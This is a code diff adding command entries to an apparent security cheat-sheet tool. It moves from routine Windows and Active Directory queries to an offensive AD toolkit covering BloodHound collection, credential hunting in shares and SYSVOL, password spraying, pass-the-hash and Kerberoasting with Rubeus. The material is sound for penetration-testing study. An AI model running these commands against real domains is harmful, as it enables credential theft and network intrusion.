+  {tabs:['cmd'], section:'System & Identity', cmd:'systeminfo', purpose:'Show detailed OS and system information.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'query user', purpose:'List logged-on user sessions.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'set', purpose:'Display environment variables.'},
+  {tabs:['cmd'], section:'System & Identity', cmd:'echo %LOGONSERVER%', purpose:'Show the logon server for the current session.'},
+
+  /* ---- CMD: Users & Groups ---- */
+  {tabs:['cmd'], section:'Users & Groups', cmd:'net user', purpose:'List local user accounts.'},
+  {tabs:['cmd'], section:'Users & Groups', cmd:'net user <username>', purpose:'Display details for a specified local user.'},
+  {tabs:['cmd'], section:'Users & Groups', cmd:'net localgroup', purpose:'List local groups.'},
+  {tabs:['cmd'], section:'Users & Groups', cmd:'net localgroup Administrators', purpose:'List members of the local Administrators group.'},
+
+  /* ---- CMD: Network & Domain Discovery ---- */
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'ipconfig /all', purpose:'Show IP configuration, DNS, gateway, and adapters.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'arp -a', purpose:'Display the ARP cache.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'route print', purpose:'Display the routing table.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'netstat -ano', purpose:'Show network connections/listeners with PIDs.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'nslookup <name>', purpose:'Resolve a hostname or domain.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>', purpose:'Query LDAP domain-controller SRV records.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'ping <host>', purpose:'Test basic host reachability.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'tracert <host>', purpose:'Trace the network path to a host.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'net view \\\\<host>', purpose:'List visible shares on a remote host.'},
+  {tabs:['cmd'], section:'Network & Domain Discovery', cmd:'net share', purpose:'List shares on the local computer.'},
+
+  /* ---- CMD: Services, Tasks & Permissions ---- */
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'sc.exe query', purpose:'List services and their states.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'sc.exe qc <service>', purpose:'Display a service\'s configuration.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'schtasks /query /fo LIST /v', purpose:'List scheduled tasks with verbose details.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'tasklist /svc', purpose:'List processes and associated services.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'icacls <path>', purpose:'Display file or directory permissions.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'dir /a <path>', purpose:'List all files, including hidden/system items.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'findstr /spin /c:<term> <path>\\*', purpose:'Search files recursively for a text pattern.'},
+  {tabs:['cmd'], section:'Services, Tasks & Permissions', cmd:'reg query <key> /s', purpose:'Query a registry key and its subkeys.'},
+
+  /* ---- Shared built-in tools (CMD + PowerShell) ---- */
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'setspn -Q */*', purpose:'Query registered Service Principal Names.'},
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'klist', purpose:'Display Kerberos tickets in the current logon session.'},
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'cmdkey /list', purpose:'List saved credential target references.'},
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'vaultcmd /list', purpose:'List Windows Credential Manager vaults.'},
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'auditpol /get /category:*', purpose:'Display audit policy settings.', admin:true},
+  {tabs:['cmd','powershell'], section:'Kerberos, Credentials & Security', cmd:'wevtutil el', purpose:'List available Windows event logs.'},
+
+  /* ---- PowerShell: System, Processes & Services ---- */
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-Process', purpose:'List running processes.'},
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-Service', purpose:'List services and their states.'},
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-ScheduledTask', purpose:'List scheduled tasks.'},
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-HotFix', purpose:'List installed Windows updates/hotfixes.'},
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-ChildItem Env:', purpose:'Display environment variables.'},
+  {tabs:['powershell'], section:'System, Processes & Services', cmd:'Get-PSDrive -PSProvider FileSystem', purpose:'List file-system drives.'},
+
+  /* ---- PowerShell: Network & Remote Management ---- */
+  {tabs:['powershell'], section:'Network & Remote Management', cmd:'Test-NetConnection <host> -Port <port>', purpose:'Test connectivity to a host and TCP port.'},
+  {tabs:['powershell'], section:'Network & Remote Management', cmd:'Get-NetTCPConnection', purpose:'Display TCP connections and listening endpoints.'},
+  {tabs:['powershell'], section:'Network & Remote Management', cmd:'Test-WSMan <host>', purpose:'Test whether WinRM responds on a remote host.'},
+  {tabs:['powershell'], section:'Network & Remote Management', cmd:'Get-SmbConnection', purpose:'Display active SMB client connections.'},
+
+  /* ---- PowerShell: Security ---- */
+  {tabs:['powershell'], section:'Kerberos, Credentials & Security', cmd:'Get-FileHash <file> -Algorithm SHA256', purpose:'Calculate a SHA-256 file hash.'},
+  {tabs:['powershell'], section:'Kerberos, Credentials & Security', cmd:'Get-MpComputerStatus', purpose:'Display Microsoft Defender status.', defender:true},
+  {tabs:['powershell'], section:'Kerberos, Credentials & Security', cmd:'Get-NetFirewallProfile', purpose:'Display Windows Firewall profile settings.'},
+
+  /* ---- WMI / CIM ---- */
+  {tabs:['wmi'], section:'WMI / CIM Classes', cmd:'Get-CimInstance Win32_OperatingSystem', purpose:'Retrieve operating-system details.'},
+  {tabs:['wmi'], section:'WMI / CIM Classes', cmd:'Get-CimInstance Win32_ComputerSystem', purpose:'Retrieve computer and domain/workgroup details.'},
+  {tabs:['wmi'], section:'WMI / CIM Classes', cmd:'Get-CimInstance Win32_Service', purpose:'Show service configuration and process details.'},
+
+  /* ---- AD: Domain & Forest (RSAT) ---- */
+  {tabs:['ad'], section:'Domain & Forest', cmd:'Get-ADDomain', purpose:'Record domain identity, domain controllers, and domain-level configuration.', rsat:true},
+  {tabs:['ad'], section:'Domain & Forest', cmd:'Get-ADForest', purpose:'Show forest structure and trust context for the current domain.', rsat:true},
+
+  /* ---- AD: Users, Groups & Computers (RSAT) ---- */
+  {tabs:['ad'], section:'Users, Groups & Computers', cmd:'Get-ADUser -Filter * -Properties Description,ServicePrincipalName', purpose:'List domain users with description and SPN attributes — review accounts that need follow-up.', rsat:true},
+  {tabs:['ad'], section:'Users, Groups & Computers', cmd:'Get-ADGroup -Filter *', purpose:'Build a structured inventory of domain groups.', rsat:true},
+  {tabs:['ad'], section:'Users, Groups & Computers', cmd:'Get-ADGroupMember "Domain Admins" -Recursive', purpose:'Resolve direct and nested membership of a privileged group.', rsat:true},
+  {tabs:['ad'], section:'Users, Groups & Computers', cmd:'Get-ADComputer -Filter * -Properties OperatingSystem', purpose:'Identify servers, workstations, and older operating-system records.', rsat:true},
+
+  /* ---- AD: Group Policy & Permissions (RSAT) ---- */
+  {tabs:['ad'], section:'Group Policy & Permissions', cmd:'Get-GPO -All', purpose:'Inventory Group Policy Objects for policy review (GroupPolicy module required).', rsat:true, gp:true},
+  {tabs:['ad'], section:'Group Policy & Permissions', cmd:'Get-Acl <AD-provider-path>', purpose:'Read the security descriptor on a specific AD object path and inspect its ACL.'},
+
+  /* ---- AD: CMD-based queries (no RSAT) ---- */
+  {tabs:['ad'], section:'Users & Groups (CMD)', cmd:'net user /domain', purpose:'Enumerate domain identities from a domain-joined host.'},
+  {tabs:['ad'], section:'Users & Groups (CMD)', cmd:'net group /domain', purpose:'Build a first-pass view of the groups exposed to the current domain user.'},
+  {tabs:['ad'], section:'Users & Groups (CMD)', cmd:'net group "Domain Admins" /domain', purpose:'Identify highly privileged domain membership with a read-only query.'},
+  {tabs:['ad'], section:'Network & Domain Discovery (CMD)', cmd:'nltest /dsgetdc:<domain>', purpose:'Confirm the domain controller and domain context before deeper AD enumeration.'},
+  {tabs:['ad'], section:'Network & Domain Discovery (CMD)', cmd:'nltest /domain_trusts', purpose:'List trusted domains visible to this host.'},
+  {tabs:['ad'], section:'Group Policy (CMD)', cmd:'gpresult /r', purpose:'See which Group Policy objects apply to the current user and computer.'},
+
+/* ================= AD TOOLKIT — Situational Awareness ================= */
+/* ---- Windows — PowerView & SharpHound ---- */
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Import-Module .\\PowerView.ps1', purpose:'Load PowerView into the current session before any Get-Domain command.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -Identity <username> -Domain <domain> | Select-Object name,samaccountname,description,memberof,whencreated,pwdlastset', purpose:'Read one account profile, group membership and password age.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainGroupMember -Identity "Domain Admins" -Recurse', purpose:'Resolve direct and nested members of a privileged group.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -SPN -Properties samaccountname,serviceprincipalname', purpose:'List accounts that hold an SPN, the Kerberoastable set.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}', purpose:'Find every object where a given SID holds an ACE.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}', purpose:'Same search with GUIDs translated into readable right names.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Find-InterestingDomainAcl', purpose:'Surface ACLs that grant broad rights such as GenericAll or WriteDacl.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainGPO | select displayname', purpose:'List Group Policy objects by display name.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}', purpose:'Check which GPOs a SID is able to modify.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainTrust', purpose:'List the trusts of the current domain.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainTrustMapping', purpose:'Walk trusts in both directions and map reachable domains.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -Domain <child-domain> | select SamAccountName', purpose:'Enumerate accounts in a child or trusted domain.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainSID', purpose:'Return the SID of the current domain.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainGroup -Domain <domain> -Identity "Enterprise Admins" | select distinguishedname,objectsid', purpose:'Get the forest-root Enterprise Admins SID.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainForeignGroupMember -Domain <domain>', purpose:'Find foreign security principals nested inside domain groups.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Convert-SidToName <sid>', purpose:'Resolve a SID to a readable account name.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Convert-NameToSid <username>', purpose:'Resolve an account name to its SID.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'ConvertFrom-SddlString "<sddl>"', purpose:'Turn a raw SDDL descriptor into readable permissions.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Test-AdminAccess -ComputerName <host>', purpose:'Test whether the current user has local admin on a host.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Desktop Users"', purpose:'Enumerate RDP group membership on a remote host.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-NetLocalGroupMember -ComputerName <host> -GroupName "Remote Management Users"', purpose:'Enumerate WinRM group membership on a remote host.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl', purpose:'Find accounts that do not require Kerberos pre-authentication.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol', purpose:'Find accounts allowed to have no password.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainUser * | Select-Object samaccountname,description | Where-Object {$_.Description -ne $null}', purpose:'Hunt for credentials left in account description fields.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerView', cmd:'Get-DomainPolicy', purpose:'Read the domain password and lockout policy.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'SharpView', cmd:'.\\SharpView.exe Get-DomainUser -Identity <username>', purpose:'Run the .NET port of PowerView where PowerShell is restricted.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'SharpView', cmd:'.\\SharpView.exe Get-DomainUser -Help', purpose:'Show the arguments SharpView accepts.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'SharpHound', cmd:'.\\SharpHound.exe -c All --zipfilename <name>', purpose:'Collect all BloodHound data and package it as a zip.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'Snaffler', cmd:'.\\Snaffler.exe -d <domain> -s -v data', purpose:'Scan readable shares for files that may hold credentials.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'SYSVOL', cmd:'ls \\\\<dc>\\SYSVOL\\<domain>\\scripts', purpose:'List logon scripts stored in SYSVOL.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'SYSVOL', cmd:'cat \\\\<dc>\\SYSVOL\\<domain>\\scripts\\<script>', purpose:'Read a script that may contain a hardcoded password.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerShell', cmd:'Add-Type -AssemblyName System.IdentityModel', purpose:'Load the Kerberos token classes used to request a service ticket.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerShell', cmd:'New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<spn>"', purpose:'Request a service ticket for one SPN in PowerShell.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerShell', cmd:"setspn.exe -T <domain> -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }", purpose:'Enumerate SPNs and request a ticket for each in one pipeline.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'AD module', cmd:'Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt', purpose:'Export every username for later ACL or AS-REP checks.', rsat:true},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerShell', cmd:'foreach($line in [System.IO.File]::ReadLines("<path>")) {get-acl "AD:\\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access}', purpose:'Loop ACL checks across a list of users.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'AD module', cmd:'Get-ADGroup -Identity "Protected Users" -Properties Name,Description,Members', purpose:'Inspect the Protected Users group and its members.', rsat:true},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'GroupPolicy', cmd:'Get-GPO -All | Select DisplayName', purpose:'Inventory Group Policy objects with the built-in module.', gp:true},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'GroupPolicy', cmd:'Get-GPO -Guid <guid>', purpose:'Resolve a GPO GUID to its display name.', gp:true},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'AD module', cmd:'Get-ADTrust -Filter *', purpose:'List trusts with the built-in Active Directory module.', rsat:true},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'netsh', cmd:'netsh advfirewall show allprofiles', purpose:'Show whether the host firewall is enabled per profile.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'Defender', cmd:'Get-MpComputerStatus', purpose:'Check Defender status before running tooling on the host.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'Defender', cmd:'sc query windefend', purpose:'Check whether the Defender service is running.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'AppLocker', cmd:'Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections', purpose:'Read the effective AppLocker rules on the host.'},
+{tabs:['sit'], section:'Windows — PowerView & SharpHound', os:'Windows', tool:'PowerShell', cmd:'$ExecutionContext.SessionState.LanguageMode', purpose:'Check whether PowerShell is running in ConstrainedLanguage mode.'},
+
+/* ---- Linux — BloodHound.py ---- */
+{tabs:['sit'], section:'Linux — BloodHound.py', os:'Linux', tool:'DNS', cmd:'nslookup <dc>.<domain>', purpose:'Confirm the attack host resolves the target domain.'},
+{tabs:['sit'], section:'Linux — BloodHound.py', os:'Linux', tool:'DNS', cmd:'cat /etc/resolv.conf', purpose:'Check which DNS server the attack host is using.'},
+{tabs:['sit'], section:'Linux — BloodHound.py', os:'Linux', tool:'BloodHound.py', cmd:"bloodhound-python -u '<user>' -p '<password>' -ns <dc-ip> -d <domain> -c all", purpose:'Collect all BloodHound data from Linux.'},
+{tabs:['sit'], section:'Linux — BloodHound.py', os:'Linux', tool:'BloodHound.py', cmd:'bloodhound-python -d <domain> -dc <dc> -c All -u <user> -p <password>', purpose:'Collect using an explicit domain controller hostname.'},
+{tabs:['sit'], section:'Linux — BloodHound.py', os:'Linux', tool:'BloodHound.py', cmd:'zip -r <name>.zip *.json', purpose:'Bundle the collected JSON for import into BloodHound.'},
+
+/* ================= AD TOOLKIT — Enumeration & SMB ================= */
+/* ---- Windows — Built-in Discovery ---- */
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'net.exe', cmd:'net use \\\\<dc>\\ipc$ "" /u:""', purpose:'Test anonymous IPC$ access to a domain controller.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'net.exe', cmd:'net use \\\\<dc>\\ipc$ "" /u:guest', purpose:'Test guest IPC$ access to a domain controller.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'net.exe', cmd:'net use \\\\<dc>\\ipc$ "<password>" /u:<user>', purpose:'Authenticate to IPC$ with a domain account.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'net.exe', cmd:'net group /domain', purpose:'List domain groups.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'net.exe', cmd:'net user /domain <username>', purpose:'Show one domain account in detail.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'dsquery', cmd:'dsquery user', purpose:'List directory user objects.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'dsquery', cmd:'dsquery computer', purpose:'List directory computer objects.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'dsquery', cmd:'dsquery * "CN=Users,DC=<domain>,DC=<tld>"', purpose:'Run a wildcard query against an OU.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'dsquery', cmd:'dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl', purpose:'Find accounts with PASSWD_NOTREQD set.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'dsquery', cmd:'dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName', purpose:'Find domain controllers by their userAccountControl bit.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'netdom', cmd:'netdom query /domain:<domain> trust', purpose:'List domain trusts.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'netdom', cmd:'netdom query /domain:<domain> dc', purpose:'List domain controllers.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'netdom', cmd:'netdom query /domain:<domain> workstation', purpose:'List workstations and member servers.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'wmic', cmd:'wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress', purpose:'Read domain and forest details through WMI.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'qwinsta', cmd:'qwinsta', purpose:'List RDP and console sessions on the local host.'},
+
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'DomainPasswordSpray', cmd:'Import-Module .\\DomainPasswordSpray.ps1', purpose:'Load the DomainPasswordSpray module.'},
+{tabs:['enum'], section:'Windows — Built-in Discovery', os:'Windows', tool:'DomainPasswordSpray', cmd:'Invoke-DomainPasswordSpray -Password <password> -OutFile spray_success -ErrorAction SilentlyContinue', purpose:'Spray one password across the domain and save the hits.'},
+
+/* ---- Linux — SMB, RPC & LDAP ---- */
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'fping', cmd:'fping -asgq <cidr>', purpose:'Sweep a subnet for live hosts.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'nmap', cmd:'nmap -A <target>', purpose:'Service and version scan a discovered host.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'rpcclient -U "" -N <dc>', purpose:'Open an anonymous RPC session.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'rpcclient -U "<user>%<password>" -c "getusername;quit" <dc>', purpose:'Validate credentials over RPC.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'querydominfo', purpose:'Read domain information inside an rpcclient session.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'getdompwinfo', purpose:'Read the password policy inside an rpcclient session.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'enumdomusers', purpose:'Enumerate domain users inside an rpcclient session.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'rpcclient', cmd:'queryuser <rid>', purpose:'Look up one account by RID inside an rpcclient session.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'enum4linux', cmd:'enum4linux -P <dc>', purpose:'Read the password policy with enum4linux.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'enum4linux', cmd:'enum4linux -U <dc> | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"', purpose:'Extract usernames from enum4linux output.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'enum4linux-ng', cmd:'enum4linux-ng -P <dc> -oA <name>', purpose:'Enumerate policy and write JSON/YAML output.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'enum4linux-ng', cmd:'cat <name>.json', purpose:'Read the enum4linux-ng results.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> -u <user> -p <password> --pass-pol', purpose:'Read the password policy with CrackMapExec.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> --users', purpose:'Enumerate domain users.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> -u <user> -p <password> --groups', purpose:'Enumerate domain groups.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <host> -u <user> -p <password> --loggedon-users', purpose:'See which users are logged on to a host.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> -u <user> -p <password> --shares', purpose:'List shares and the access level granted.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:"crackmapexec smb <dc> -u <user> -p <password> -M spider_plus --share '<share>'", purpose:'Index every file in a share with the spider_plus module.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'CrackMapExec', cmd:'crackmapexec smb <dc> --local-auth -u <user> -H <hash>', purpose:'Pass-the-hash against local accounts.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'smbmap', cmd:'smbmap -u <user> -p <password> -d <domain> -H <dc>', purpose:'Map shares and permissions across a host.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'smbmap', cmd:"smbmap -u <user> -p <password> -d <domain> -H <dc> -R '<share>' --dir-only", purpose:'Recursively list directories inside a share.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'ldapsearch', cmd:'ldapsearch -h <dc> -x -b "DC=<domain>,DC=<tld>" -s sub "*"', purpose:'Bind anonymously and dump the directory over LDAP.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'ldapsearch', cmd:'ldapsearch -h <dc> -x -b "DC=<domain>,DC=<tld>" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "', purpose:'Extract usernames over LDAP.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'windapsearch', cmd:'./windapsearch.py --dc-ip <dc> -u "" -U', purpose:'Enumerate users anonymously.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'windapsearch', cmd:'python3 windapsearch.py --dc-ip <dc> -u <user>@<domain> -p <password> --da', purpose:'Enumerate Domain Admins.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'windapsearch', cmd:'python3 windapsearch.py --dc-ip <dc> -u <user>@<domain> -p <password> -PU', purpose:'Enumerate privileged users.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'adidnsdump', cmd:'adidnsdump -u <domain>\\\\<user> ldap://<dc>', purpose:'Dump AD-integrated DNS records.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'adidnsdump', cmd:'adidnsdump -u <domain>\\\\<user> ldap://<dc> -r', purpose:'Resolve DNS records that are not readable by default.'},
+{tabs:['enum'], section:'Linux — SMB, RPC & LDAP', os:'Linux', tool:'adidnsdump', cmd:'head records.csv', purpose:'Inspect the dumped DNS records.'},
+
+/* ================= AD TOOLKIT — Kerberos Abuse ================= */
+/* ---- Windows — Rubeus ---- */
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'setspn', cmd:'setspn.exe -Q */*', purpose:'Enumerate every registered Service Principal Name.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'klist', cmd:'klist', purpose:'List the Kerberos tickets in the current logon session.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe', purpose:'Show Rubeus usage and available commands.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe kerberoast /stats', purpose:'Count Kerberoastable accounts without requesting tickets.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:".\\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap", purpose:'Kerberoast only accounts with adminCount set.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe kerberoast /user:<user> /nowrap', purpose:'Request a TGS hash for one account.'},
+{tabs:['kerb'], section:'Windows — Rubeus', os:'Windows', tool:'Rubeus', cmd:'.\\Rubeus.exe kerberoast /domain:<domain> /user:<user> /nowrap', purpose:'Kerberoast an account in another domain.'},
